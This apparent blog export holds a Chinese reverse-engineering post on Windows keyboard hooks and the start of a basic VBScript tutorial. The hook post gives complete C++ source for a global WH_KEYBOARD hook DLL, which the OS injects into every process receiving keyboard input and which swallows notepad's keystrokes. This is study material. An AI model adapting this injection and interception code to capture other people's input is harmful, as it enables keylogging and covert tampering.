此参数的取值可为下列值之一：\n\n\n\n值\n含义\n\n\n\nWH_CALLWNDPROC（4）\n安装一个挂钩过程，用于在系统将消息发送到目标窗口过程之前监视消息。 有关详细信息，请参阅 CallWindowProcW 函数&#x2F;CallWindowProcA 函数 挂钩过程。\n\n\nWH_CALLWNDPROCRET（12）\n安装一个挂钩过程，该过程在目标窗口过程处理消息后监视消息。 有关详细信息，请参阅 [HOOKPROC 回调函数] (nc-winuser-hookproc.md) 挂钩过程。\n\n\nWH_CBT（5）\n安装用于接收对 CBT 应用程序有用的通知的挂钩过程。 有关详细信息，请参阅 CBTProc 挂钩过程。\n\n\nWH_DEBUG（9）\n安装可用于调试其他挂钩过程的挂钩过程。 有关详细信息，请参阅 DebugProc 挂钩过程。\n\n\nWH_FOREGROUNDIDLE（11）\n安装将在应用程序的前台线程变为空闲状态时调用的挂钩过程。 此挂钩可用于在空闲时间执行低优先级任务。 有关详细信息，请参阅 ForegroundIdleProc 挂钩过程。\n\n\nWH_GETMESSAGE（3）\n安装用于监视发布到消息队列的消息的挂钩过程。 有关详细信息，请参阅 GetMsgProc 挂钩过程。\n\n\nWH_JOURNALPLAYBACK（1）\n警告Windows 11及更新版本：不支持日记挂钩 API。 建议改用 SendInput TextInput API。安装一个挂钩过程，该过程发布以前由 WH_JOURNALRECORD 挂钩过程记录的消息。 有关详细信息，请参阅 JournalPlaybackProc 挂钩过程。\n\n\nWH_JOURNALRECORD（0）\n警告Windows 11及更新版本：不支持日记挂钩 API。 建议改用 SendInput TextInput API。安装一个挂钩过程，用于记录发布到系统消息队列的输入消息。 此挂钩可用于记录宏。 有关详细信息，请参阅 JournalRecordProc 挂钩过程。\n\n\nWH_KEYBOARD（2）\n安装用于监视击键消息的挂钩过程。 有关详细信息，请参阅 KeyboardProc 挂钩过程。\n\n\nWH_KEYBOARD_LL（13）\n安装用于监视低级别键盘输入事件的挂钩过程。 有关详细信息，请参阅 [LowLevelKeyboardProc] (&#x2F;windows&#x2F;win32&#x2F;winmsg&#x2F;lowlevelkeyboardproc) 挂钩过程。\n\n\nWH_MOUSE（7）\n安装监视鼠标消息的挂钩过程。 有关详细信息，请参阅 MouseProc 挂钩过程。\n\n\nWH_MOUSE_LL（14）\n安装用于监视低级别鼠标输入事件的挂钩过程。 有关详细信息，请参阅 LowLevelMouseProc 挂钩过程。\n\n\nWH_MSGFILTER（-1）\n安装挂钩过程，用于监视由于对话框、消息框、菜单或滚动条中的输入事件而生成的消息。 有关详细信息，请参阅 MessageProc 挂钩过程。\n\n\nWH_SHELL（10）\n安装一个挂钩过程，用于接收对 shell 应用程序有用的通知。 有关详细信息，请参阅 ShellProc 挂钩过程。\n\n\nWH_SYSMSGFILTER（6）\n安装挂钩过程，用于监视由于对话框、消息框、菜单或滚动条中的输入事件而生成的消息。 挂钩过程监视与调用线程位于同一桌面中的所有应用程序的消息。 有关详细信息，请参阅 SysMsgProc 挂钩过程。\n\n\n[in] lpfn指向挂钩过程的指针。 如果 dwThreadId 参数为零或指定由其他进程创建的线程的标识符， 则 lpfn 参数必须指向 DLL 中的挂钩过程。 否则， lpfn 可以指向与当前进程关联的代码中的挂钩过程。\n该指针指向的函数，根据 idHook的值来定，具体见上表\n[in] hmodDLL 的句柄，其中包含 lpfn 参数指向的挂钩过程。 如果 dwThreadId 参数指定当前进程创建的线程，并且挂钩过程位于与当前进程关联的代码中，则必须将 hMod 参数设置为 NULL。\n[in] dwThreadId要与挂钩过程关联的线程的标识符。 对于桌面应用，如果此参数为零，则挂钩过程与调用线程在同一桌面中运行的所有现有线程相关联。\n返回值类型： HHOOK\n如果函数成功，则返回值是挂钩过程的句柄。\n如果函数失败，则返回值为 NULL。 要获得更多的错误信息，请调用 GetLastError。\n练习本例使用键盘钩取技术，拦截notepad.exe进程的键盘消息，使之无法显示在记事本中。\nKeyHook.dll文件是一个含有钩子过程的DLL文件。HookMain.exe是最先加载KeyHook.dll并安装键盘钩子的程序。HookMain.exe加载KeyHook.dll文件后使用SetWindowsHookEx()安装键盘钩子（KeyboardProc()）。若其他进程中发生键盘输入事件，OS就会强制将KeyHook.dll加载到相应进程的内存，然后调用KeyboardProc()函数。\nHookMain.cpp源码分析HookMain.exe先加载KeyHook.dll文件，然后调用HookStart()函数开始钩取，用户输入’q’时，调用HookStop()函数终止钩取。\n12345678910111213141516171819202122232425262728293031323334353637383940414243#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#define\tDEF_DLL_NAME\t\t&quot;KeyHook.dll&quot;#define\tDEF_HOOKSTART\t\t&quot;HookStart&quot;#define\tDEF_HOOKSTOP\t\t&quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main()&#123;\tHMODULE\t\t\thDll = NULL;\tPFN_HOOKSTART\tHookStart = NULL;\tPFN_HOOKSTOP\tHookStop = NULL;\tchar\t\t\tch = 0;    //加载KeyHook.dll\thDll = LoadLibraryA(DEF_DLL_NAME);    if( hDll == NULL )    &#123;        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());        return;    &#125;    //获取导出函数地址\tHookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);\tHookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);    //开始钩取\tHookStart();    //等待直到用户输入&#x27;q&#x27;\tprintf(&quot;press &#x27;q&#x27; to quit!\\n&quot;);\twhile( _getch() != &#x27;q&#x27; )\t;    //终止钩取\tHookStop();\t    //卸载KeyHook.dll\tFreeLibrary(hDll);&#125;\n\nKeyHook.cpp源码分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME\t\t&quot;notepad.exe&quot;HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL;HWND g_hWnd = NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123;\tswitch( dwReason )\t&#123;        case DLL_PROCESS_ATTACH:\t\t\tg_hInstance = hinstDLL;\t\t\tbreak;        case DLL_PROCESS_DETACH:\t\t\tbreak;\t\t&#125;\treturn TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123;\tchar szPath[MAX_PATH] = &#123;0,&#125;;\tchar *p = NULL;\tif( nCode &gt;= 0 )\t&#123;\t\t// bit 31 : 0 =&gt; key press, 1 =&gt; key release\t\tif( !(lParam &amp; 0x80000000) ) //释放键盘按键时\t\t&#123;\t\t\tGetModuleFileNameA(NULL, szPath, MAX_PATH);\t\t\tp = strrchr(szPath, &#x27;\\\\&#x27;);            // 比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序（或下一个钩子）\t\t\tif( !_stricmp(p + 1, DEF_PROCESS_NAME) )\t\t\t\treturn 1;\t\t&#125;\t&#125;    //若非notepad.exe，则调用CallNextHookEx()函数    //将消息传递给应用程序（或下一个钩子）\treturn CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif\t__declspec(dllexport) void HookStart()\t&#123;\t\tg_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);\t&#125;\t__declspec(dllexport) void HookStop()\t&#123;\t\tif( g_hHook )\t\t&#123;\t\t\tUnhookWindowsHookEx(g_hHook);\t\t\tg_hHook = NULL;\t\t&#125;\t&#125;#ifdef __cplusplus&#125;#endif\n\nDLL的代码很简单，调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链。\nKeyboardProc()当SetWindowsHookEx()函数的第一个参数为WH_KEYBOARD（2）时，就会安装监视键盘消息的挂钩过程（KeyboardProc()）。\n安装好键盘钩子后，无论哪个进程，只要发生键盘输入事件，OS就会强制将KeyHook.dll注入相应进程。加载了KeyHook.dll的进程中，发生键盘事件时会首先调用执行KeyHook.KeyboardProc()。\nKeyboardProc()函数中发生键盘输入事件时，就会比较当前进程的名称是否为notepad.exe，若是，则返回1，终止KeyboardProc()函数，这意味着截获并删除消息。这样键盘消息就不会传递到notepad.exe程序的消息队列。\n除此之外（即当前进程非notepad.exe），执行return CallNextHookEx(g_hHook, nCode, wParam, lParam);语句，消息会被传递到另一个应用程序或钩链的另一个钩子函数。\nKeyboardProc()的定义12345LRESULT CALLBACK KeyboardProc(  _In_ int    code,  _In_ WPARAM wParam,  _In_ LPARAM lParam);\n\nKeyboardProc()的参数\ncode\n挂钩过程用于确定如何处理消息的代码。如果 代码 小于零，挂钩过程必须将消息传递给 CallNextHookEx 函数，而无需进一步处理，并且应返回 CallNextHookEx 返回的值。\n其取值有HC_ACTION（0）或HC_NOREMOVE（3）\n\nwParam\n生成 击键 消息的密钥的虚拟密钥代码。其值有如下内容：\n参考：https://learn.microsoft.com/zh-cn/windows/win32/inputdev/virtual-key-codes\n\n\n\n常数\nValue\n说明\n\n\n\nVK_LBUTTON\n0x01\n鼠标左键\n\n\nVK_RBUTTON\n0x02\n鼠标右键\n\n\nVK_CANCEL\n0x03\n控制中断处理\n\n\nVK_MBUTTON\n0x04\n鼠标中键\n\n\nVK_XBUTTON1\n0x05\nX1 鼠标按钮\n\n\nVK_XBUTTON2\n0x06\nX2 鼠标按钮\n\n\n-\n0x07\n保留\n\n\nVK_BACK\n0x08\nBACKSPACE 键\n\n\nVK_TAB\n0x09\nTab 键\n\n\n-\n0x0A-0B\n预留\n\n\nVK_CLEAR\n0x0C\nCLEAR 键\n\n\nVK_RETURN\n0x0D\nEnter 键\n\n\n-\n0x0E-0F\n未分配\n\n\nVK_SHIFT\n0x10\nSHIFT 键\n\n\nVK_CONTROL\n0x11\nCTRL 键\n\n\nVK_MENU\n0x12\nAlt 键\n\n\nVK_PAUSE\n0x13\nPAUSE 键\n\n\nVK_CAPITAL\n0x14\nCAPS LOCK 键\n\n\nVK_KANA\n0x15\nIME Kana 模式\n\n\nVK_HANGUL\n0x15\nIME Hanguel 模式\n\n\nVK_IME_ON\n0x16\nIME 打开\n\n\nVK_JUNJA\n0x17\nIME Junja 模式\n\n\nVK_FINAL\n0x18\nIME 最终模式\n\n\nVK_HANJA\n0x19\nIME Hanja 模式\n\n\nVK_KANJI\n0x19\nIME Kanji 模式\n\n\nVK_IME_OFF\n0x1A\nIME 关闭\n\n\nVK_ESCAPE\n0x1B\nESC 键\n\n\nVK_CONVERT\n0x1C\nIME 转换\n\n\nVK_NONCONVERT\n0x1D\nIME 不转换\n\n\nVK_ACCEPT\n0x1E\nIME 接受\n\n\nVK_MODECHANGE\n0x1F\nIME 模式更改请求\n\n\nVK_SPACE\n0x20\n空格键\n\n\nVK_PRIOR\n0x21\nPAGE UP 键\n\n\nVK_NEXT\n0x22\nPAGE DOWN 键\n\n\nVK_END\n0x23\nEND 键\n\n\nVK_HOME\n0x24\nHOME 键\n\n\nVK_LEFT\n0x25\nLEFT ARROW 键\n\n\nVK_UP\n0x26\nUP ARROW 键\n\n\nVK_RIGHT\n0x27\nRIGHT ARROW 键\n\n\nVK_DOWN\n0x28\nDOWN ARROW 键\n\n\nVK_SELECT\n0x29\nSELECT 键\n\n\nVK_PRINT\n0x2A\nPRINT 键\n\n\nVK_EXECUTE\n0x2B\nEXECUTE 键\n\n\nVK_SNAPSHOT\n0x2C\nPRINT SCREEN 键\n\n\nVK_INSERT\n0x2D\nINS 键\n\n\nVK_DELETE\n0x2E\nDEL 键\n\n\nVK_HELP\n0x2F\nHELP 键\n\n\n\n0x30\n0 键\n\n\n\n0x31\n1 个键\n\n\n\n0x32\n2 键\n\n\n\n0x33\n3 键\n\n\n\n0x34\n4 键\n\n\n\n0x35\n5 键\n\n\n\n0x36\n6 键\n\n\n\n0x37\n7 键\n\n\n\n0x38\n8 键\n\n\n\n0x39\n9 键\n\n\n-\n0x3A-40\nUndefined\n\n\n\n0x41\nA 键\n\n\n\n0x42\nB 键\n\n\n\n0x43\nC 键\n\n\n\n0x44\nD 键\n\n\n\n0x45\nE 键\n\n\n\n0x46\nF 键\n\n\n\n0x47\nG 键\n\n\n\n0x48\nH 键\n\n\n\n0x49\nI 键\n\n\n\n0x4A\nJ 键\n\n\n\n0x4B\nK 键\n\n\n\n0x4C\nL 键\n\n\n\n0x4D\nM 键\n\n\n\n0x4E\nN 键\n\n\n\n0x4F\nO 键\n\n\n\n0x50\nP 键\n\n\n\n0x51\nQ 键\n\n\n\n0x52\nR 键\n\n\n\n0x53\nS 键\n\n\n\n0x54\nT 键\n\n\n\n0x55\nU 键\n\n\n\n0x56\nV 键\n\n\n\n0x57\nW 键\n\n\n\n0x58\nX 键\n\n\n\n0x59\nY 键\n\n\n\n0x5A\nZ 键\n\n\nVK_LWIN\n0x5B\n左 Windows 键\n\n\nVK_RWIN\n0x5C\n右侧 Windows 键\n\n\nVK_APPS\n0x5D\n应用程序密钥\n\n\n-\n0x5E\n预留\n\n\nVK_SLEEP\n0x5F\n计算机休眠键\n\n\nVK_NUMPAD0\n0x60\n数字键盘 0 键\n\n\nVK_NUMPAD1\n0x61\n数字键盘 1 键\n\n\nVK_NUMPAD2\n0x62\n数字键盘 2 键\n\n\nVK_NUMPAD3\n0x63\n数字键盘 3 键\n\n\nVK_NUMPAD4\n0x64\n数字键盘 4 键\n\n\nVK_NUMPAD5\n0x65\n数字键盘 5 键\n\n\nVK_NUMPAD6\n0x66\n数字键盘 6 键\n\n\nVK_NUMPAD7\n0x67\n数字键盘 7 键\n\n\nVK_NUMPAD8\n0x68\n数字键盘 8 键\n\n\nVK_NUMPAD9\n0x69\n数字键盘 9 键\n\n\nVK_MULTIPLY\n0x6A\n乘号键\n\n\nVK_ADD\n0x6B\n加号键\n\n\nVK_SEPARATOR\n0x6C\n分隔符键\n\n\nVK_SUBTRACT\n0x6D\n减号键\n\n\nVK_DECIMAL\n0x6E\n句点键\n\n\nVK_DIVIDE\n0x6F\n除号键\n\n\nVK_F1\n0x70\nF1 键\n\n\nVK_F2\n0x71\nF2 键\n\n\nVK_F3\n0x72\nF3 键\n\n\nVK_F4\n0x73\nF4 键\n\n\nVK_F5\n0x74\nF5 键\n\n\nVK_F6\n0x75\nF6 键\n\n\nVK_F7\n0x76\nF7 键\n\n\nVK_F8\n0x77\nF8 键\n\n\nVK_F9\n0x78\nF9 键\n\n\nVK_F10\n0x79\nF10 键\n\n\nVK_F11\n0x7A\nF11 键\n\n\nVK_F12\n0x7B\nF12 键\n\n\nVK_F13\n0x7C\nF13 键\n\n\nVK_F14\n0x7D\nF14 键\n\n\nVK_F15\n0x7E\nF15 键\n\n\nVK_F16\n0x7F\nF16 键\n\n\nVK_F17\n0x80\nF17 键\n\n\nVK_F18\n0x81\nF18 键\n\n\nVK_F19\n0x82\nF19 键\n\n\nVK_F20\n0x83\nF20 键\n\n\nVK_F21\n0x84\nF21 键\n\n\nVK_F22\n0x85\nF22 键\n\n\nVK_F23\n0x86\nF23 键\n\n\nVK_F24\n0x87\nF24 键\n\n\n-\n0x88-8F\n保留\n\n\nVK_NUMLOCK\n0x90\nNUM LOCK 键\n\n\nVK_SCROLL\n0x91\nSCROLL LOCK 键\n\n\n-\n0x92-96\nOEM 特有\n\n\n-\n0x97-9F\n未分配\n\n\nVK_LSHIFT\n0xA0\n左 SHIFT 键\n\n\nVK_RSHIFT\n0xA1\n右 SHIFT 键\n\n\nVK_LCONTROL\n0xA2\n左 Ctrl 键\n\n\nVK_RCONTROL\n0xA3\n右 Ctrl 键\n\n\nVK_LMENU\n0xA4\n左 ALT 键\n\n\nVK_RMENU\n0xA5\n右 ALT 键\n\n\nVK_BROWSER_BACK\n0xA6\n浏览器后退键\n\n\nVK_BROWSER_FORWARD\n0xA7\n浏览器前进键\n\n\nVK_BROWSER_REFRESH\n0xA8\n浏览器刷新键\n\n\nVK_BROWSER_STOP\n0xA9\n浏览器停止键\n\n\nVK_BROWSER_SEARCH\n0xAA\n浏览器搜索键\n\n\nVK_BROWSER_FAVORITES\n0xAB\n浏览器收藏键\n\n\nVK_BROWSER_HOME\n0xAC\n浏览器“开始”和“主页”键\n\n\nVK_VOLUME_MUTE\n0xAD\n静音键\n\n\nVK_VOLUME_DOWN\n0xAE\n音量减小键\n\n\nVK_VOLUME_UP\n0xAF\n音量增加键\n\n\nVK_MEDIA_NEXT_TRACK\n0xB0\n下一曲目键\n\n\nVK_MEDIA_PREV_TRACK\n0xB1\n上一曲目键\n\n\nVK_MEDIA_STOP\n0xB2\n停止媒体键\n\n\nVK_MEDIA_PLAY_PAUSE\n0xB3\n播放&#x2F;暂停媒体键\n\n\nVK_LAUNCH_MAIL\n0xB4\n启动邮件键\n\n\nVK_LAUNCH_MEDIA_SELECT\n0xB5\n选择媒体键\n\n\nVK_LAUNCH_APP1\n0xB6\n启动应用程序 1 键\n\n\nVK_LAUNCH_APP2\n0xB7\n启动应用程序 2 键\n\n\n-\n0xB8-B9\n预留\n\n\nVK_OEM_1\n0xBA\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键;:\n\n\nVK_OEM_PLUS\n0xBB\n对于任何国家&#x2F;地区，键+\n\n\nVK_OEM_COMMA\n0xBC\n对于任何国家&#x2F;地区，键,\n\n\nVK_OEM_MINUS\n0xBD\n对于任何国家&#x2F;地区，键-\n\n\nVK_OEM_PERIOD\n0xBE\n对于任何国家&#x2F;地区，键.\n\n\nVK_OEM_2\n0xBF\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键/?\n\n\nVK_OEM_3\n0xC0\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键&#96;&#96;~&#96;\n\n\n-\n0xC1-DA\n保留\n\n\nVK_OEM_4\n0xDB\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键[&#123;\n\n\nVK_OEM_5\n0xDC\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键&#96;\\\n\n\nVK_OEM_6\n0xDD\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键]&#125;\n\n\nVK_OEM_7\n0xDE\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键&#39;&quot;\n\n\nVK_OEM_8\n0xDF\n用于杂项字符；它可能因键盘而异。\n\n\n-\n0xE0\n预留\n\n\n-\n0xE1\nOEM 特有\n\n\nVK_OEM_102\n0xE2\n美国标准键盘上的 &lt;&gt; 键，或非美国 102 键键盘上的 &#96;\\\n\n\n-\n0xE3-E4\nOEM 特有\n\n\nVK_PROCESSKEY\n0xE5\nIME PROCESS 键\n\n\n-\n0xE6\nOEM 特有\n\n\nVK_PACKET\n0xE7\n用于将 Unicode 字符当作键击传递。 VK_PACKET 键是用于非键盘输入法的 32 位虚拟键值的低位字。 有关更多信息，请参阅 KEYBDINPUT、SendInput、WM_KEYDOWN 和 WM_KEYUP 中的注释\n\n\n-\n0xE8\n未分配\n\n\n-\n0xE9-F5\nOEM 特有\n\n\nVK_ATTN\n0xF6\nAttn 键\n\n\nVK_CRSEL\n0xF7\nCrSel 键\n\n\nVK_EXSEL\n0xF8\nExSel 键\n\n\nVK_EREOF\n0xF9\nErase EOF 键\n\n\nVK_PLAY\n0xFA\nPlay 键\n\n\nVK_ZOOM\n0xFB\nZoom 键\n\n\nVK_NONAME\n0xFC\n预留\n\n\nVK_PA1\n0xFD\nPA1 键\n\n\nVK_OEM_CLEAR\n0xFE\nClear 键\n\n\n\nlParam\n\n\n​            重复计数、扫描代码、扩展键标志、上下文代码、以前的键状态标志和转换状态标志。  有关 lParam 参数的详细信息，请参阅 击键消息标志。下表描述了此值的位。\n\n\n\nBits\n说明\n\n\n\n0-15\n重复计数。 该值是用户按住键后重复击键的次数。\n\n\n16-23\n扫描代码。 此值取决于 OEM。\n\n\n24\n指示键是扩展键，例如功能键还是数字键盘上的键。 如果键是扩展键，则值为 1;否则为 0。\n\n\n25-28\n保留。\n\n\n29\n上下文代码。 如果 Alt 键关闭，则值为 1;否则为 0。\n\n\n30\n上一个键状态。 如果在发送消息之前键关闭，则值为 1;如果键已打开，则为 0。\n\n\n31\n转换状态。 如果按下键，则值为 0;如果释放键，则值为 1。\n\n\n下图显示了这些标志和值在 lParam 参数中的位置。\n\n应用程序可以使用以下值从 lParam 的高位字中获取击键标志。\n\n\n\n值\n说明\n\n\n\nKF_EXTENDED 0x0100\n操作扩展键标志。\n\n\nKF_DLGMODE 0x0800\n操作对话框模式标志，该标志指示对话框是否处于活动状态。\n\n\nKF_MENUMODE 0x1000\n操作菜单模式标志，该标志指示菜单是否处于活动状态。\n\n\nKF_ALTDOWN 0x2000\n操作上下文代码标志。\n\n\nKF_REPEAT 0x4000\n操作上一个键状态标志。\n\n\nKF_UP 0x8000\n操作转换状态标志。\n\n\nKeyboardProc()的返回值如果 代码 小于零，挂钩过程必须返回 CallNextHookEx 返回的值。\n如果 代码 大于或等于零，并且挂钩过程未处理消息，强烈建议调用 CallNextHookEx 并返回它返回的值;否则，安装 WH_KEYBOARD 挂钩的其他应用程序将不会收到挂钩通知，因此行为可能不正确。\n如果挂钩过程处理了消息，它可能会返回非零值，以防止系统将消息传递给挂钩链的其余部分或目标窗口过程。\n","slug":"消息Hook","date":"2022-03-20T05:39:13.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理","author_index":"0netry"},{"id":"28df775ed85d265dbcba7f21d8f65afc","title":"VBScript教程","content":"VBScript 变量VBScript 变量VBScript 变量用于保存值或表达式。\n变量可以有一个短的名称，如 x，或一个更具描述性的名称，如 carname。\nVBScript 变量名称的规则：\n\n必须以字母开头\n不能包含点号（.）\n不能超过 255 个字符\n\n在 VBScript 中，所有的变量都与类型 variant 相关，可存储不同类型的数据。\n\n声明（创建）VBScript 变量在 VBScript 创建变量通常指”声明”变量。\n可以通过 Dim、Public 或 Private 语句声明 VBScript 变量。如下所示：\n12Dim xDim carname\n\n也可以在脚本中通过使用它的名称来声明变量。如下所示：\n1carname=&quot;Volvo&quot;\n\n现在又创建了一个变量。变量的名称是 “carname”。但是这个做法不是一个好习惯，因为可能会在脚本中拼错变量名，那样可能会在脚本运行时引起奇怪的结果。\n如果拼错变量名，比如 “carname” 变量错拼为 “carnime”，脚本会自动创建一个名为 “carnime” 的新变量。为了防止脚本这样做，可以使用 Option Explicit 语句。如果使用这个语句，就必须使用 dim、public 或 private 语句来声明所有的变量。\n把 Option Explicit 语句放置于脚本的顶端，如下所示：\n123Option ExplicitDim carnamecarname=some value\n\n\n\n\n为变量赋值可以为某个变量赋值，如下所示：\n12carname=&quot;Volvo&quot;x=10\n\n变量名是在表达式的左侧，需要赋给变量的值在表达式的右侧。现在变量 “carname” 的值是 “Volvo”，变量 “x” 的值是 “10”。\n\n变量的生存期变量的生存期指的是它可以存在的时长。\n当在一个子程序中声明变量时，变量只能在此程序内进行访问。当退出此程序时，变量也会失效。这样的变量称为本地变量。可以在不同的子程序中使用名称相同的本地变量，因为每个变量只能在声明它的程序内得到识别。\n如果在子程序以外声明了一个变量，在页面上的所有子程序都可以访问它。这类变量的生存期始于它们被声明，止于页面被关闭。\n\nVBScript 数组变量数组变量用于在一个单一的变量中存储多个值。\n在下面的实例中，声明了一个包含 3 个元素的数组：\n1Dim names(2)\n\n括号内显示的数字是 2。数组的下标以 0 开始，因此该数组包含 3 个元素。这是容量固定的数组。可以为数组的每个元素分配数据，如下所示：\n123names(0)=&quot;Tove&quot;names(1)=&quot;Jani&quot;names(2)=&quot;Stale&quot;\n\n同样地，通过使用特定数组元素的下标号，可以取回任何元素的值。如下所示：\n1mother=names(0)\n\n可以在一个数组中使用多达 60 个维数。声明多维数组的方法是在括号中用逗号来分隔数字。以下例子声明了一个包含 5 行 7 列的 2 维数组：\n1Dim table(4,6)\n\n为二维数组赋值：\n实例（仅适用于 IE）1234567891011121314151617181920212223242526&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/vbscript&quot;&gt;Dim x(2,2)x(0,0)=&quot;Volvo&quot;x(0,1)=&quot;BMW&quot;x(0,2)=&quot;Ford&quot;x(1,0)=&quot;Apple&quot;x(1,1)=&quot;Orange&quot;x(1,2)=&quot;Banana&quot;x(2,0)=&quot;Coke&quot;x(2,1)=&quot;Pepsi&quot;x(2,2)=&quot;Sprite&quot;for i=0 to 2document.write(&quot;&lt;p&gt;&quot;)for j=0 to 2document.write(x(i,j) &amp; &quot;&lt;br /&gt;&quot;)nextdocument.write(&quot;&lt;/p&gt;&quot;)next&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nVBScript 程序\nVBScript 可使用两种程序：\n\n子程序\n函数程序\n\n\nVBScript 子程序子程序：\n\n是一系列的语句，被封装在 Sub 和 End Sub 语句内\n可执行某些操作，但不会返回值\n可带有参数\n\n123Sub mysub()some statementsEnd Sub\n\n或者\n123Sub mysub(argument1,argument2)some statementsEnd Sub\n\n\n\n实例（仅适用于 IE）123Sub mysub()document.write(&quot;I was written by a sub procedure&quot;)End Sub\n\n\n\n\nVBScript 函数程序函数程序\n\n是一系列的语句，被封装在 Function 和 End Function 语句内\n可执行某些操作，并会返回值\n可带有通过程序调用来向其传递的参数。\n如果没有参数，必须带有空的圆括号 ()\n通过向函数程序名赋值的方式，可使其返回值\n\n1234Function myfunction()some statementsmyfunction=some valueEnd Function\n\n或者\n1234Function myfunction(argument1,argument2)some statementsmyfunction=some valueEnd Function\n\n\n\n实例（仅适用于 IE）123function myfunction()myfunction=Date()end function\n\n\n\n\n调用程序这个简单的函数程序被调用来计算两个参数的和：\n实例（仅适用于 IE）12345Function myfunction(a,b)myfunction=a+bEnd Functiondocument.write(myfunction(5,9))\n\n函数 “myfunction” 将返回参数 “a” 和参数 “b” 的和。这里返回的是 14。\n当调用程序时，可以使用 Call 语句，如下所示：\n1Call MyProc(argument)\n\n或者，可以省略 Call 语句，如下所示：\n1MyProc argument\n\nVBScript 条件语句\n条件语句条件语句用于根据不同的情况执行不同的操作。\n在 VBScript 中，可以使用四种条件语句：\n\nIf 语句 - 假如希望在条件为 true 时执行一系列的代码，可以使用这个语句\nIf…Then…Else 语句 - 假如希望执行两套代码其中之一，可以使用这个语句\nIf…Then…ElseIf 语句 - 假如希望选择多套代码之一来执行，可以使用这个语句\nSelect Case 语句 - 假如希望选择多套代码之一来执行，可以使用这个语句\n\n\nIf…Then…Else在下面的情况中，可以使用 If…Then…Else 语句：\n\n在条件为 true 时，执行某段代码\n选择两段代码之一来执行\n\n如果在条件为 true 时只执行一条语句，可以把代码写为一行：\n1If i=10 Then alert(&quot;Hello&quot;)\n\n在上面的代码中，没有 ..Else.. 语句。我们仅仅让代码在条件为 true 时（当 i&#x3D;10 时）执行一项操作。\n如果在条件为 true 时执行不止一条语句，那么就必须在一行写一条语句，然后使用关键词 “End If” 来结束这个语句：\n1234If i=10 Thenalert(&quot;Hello&quot;)i = i+1End If\n\n在上面的代码中，同样没有 ..Else.. 语句。我们仅仅让代码在条件为 true 时执行了多项操作。\n假如想要在条件为 true 时执行某条语句，并在条件不为 true 时执行另一条语句，就必须添加关键词 “Else”：\n实例（仅适用于 IE）12345678&lt;script type=&quot;text/vbscript&quot;&gt;i=hour(time)If i &lt; 10 Thendocument.write(&quot;Good morning!&quot;)Elsedocument.write(&quot;Have a nice day!&quot;)End If&lt;/script&gt;\n\n在上面的代码中，当条件为 true 时会执行第一段代码，当条件不成立时执行第二段代码（当 i 大于 10 时）。\n\nIf…Then…ElseIf如果想要选择多套代码之一来执行，可以使用 If…Then…ElseIf 语句：\n实例（仅适用于 IE）\n1234567891011121314&lt;script type=&quot;text/vbscript&quot;&gt;i=hour(time)If i = 10 Thendocument.write(&quot;Just started...!&quot;)ElseIf i = 11 Thendocument.write(&quot;Hungry!&quot;)ElseIf i = 12 Thendocument.write(&quot;Ah, lunch-time!&quot;)ElseIf i = 16 Thendocument.write(&quot;Time to go home!&quot;)Elsedocument.write(&quot;Unknown&quot;)End If&lt;/script&gt;\n\n\n\nSelect Case如果想要选择多套代码之一来执行，可以使用 “Select Case” 语句：\n实例（仅适用于 IE）12345678910111213141516171819&lt;script type=&quot;text/vbscript&quot;&gt;d=weekday(date)Select Case dCase 1document.write(&quot;Sleepy Sunday&quot;)Case 2document.write(&quot;Monday again!&quot;)Case 3document.write(&quot;Just Tuesday!&quot;)Case 4document.write(&quot;Wednesday!&quot;)Case 5document.write(&quot;Thursday...&quot;)Case 6document.write(&quot;Finally Friday!&quot;)Case elsedocument.write(&quot;Super Saturday!!!!&quot;)End Select&lt;/script&gt;\n\n以上代码的工作原理：首先，需要一个简单的表达式（常常是一个变量），并且这个表达式会被做一次求值运算。然后，表达式的值会与每个 Case 中的值作比较。如果匹配，被匹配的 Case 所对应的代码会被执行。\nVBScript 循环\n循环语句循环语句用于运行相同的代码块指定的次数。\n在 VBScript 中，可以使用四种循环语句：\n\nFor…Next 语句 - 运行一段代码指定的次数\nFor Each…Next 语句 - 针对集合中的每个项目或者数组中的每个元素来运行某段代码\nDo…Loop 语句 - 运行循环，当条件为 true 或者直到条件为 true 时\nWhile…Wend 语句 - 不要使用这个语句 - 请使用 Do…Loop 语句代替它\n\n\nFor…Next 循环请使用 For…Next 语句运行一段代码指定的次数。\nFor 语句规定计数变量（i）以及它的初始值和结束值。Next 语句会以 1 作为步进值来递增变量（i）。\n实例1234567891011&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/vbscript&quot;&gt;For i = 0 To 5document.write(&quot;The number is &quot; &amp; i &amp; &quot;&lt;br /&gt;&quot;)Next&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nStep 关键词通过 Step 关键词，可以规定计数变量递增或递减的步进值。\n在下面的实例中，计数变量（i）每次循环的递增步进值为 2。\n123For i=2 To 10 Step 2some 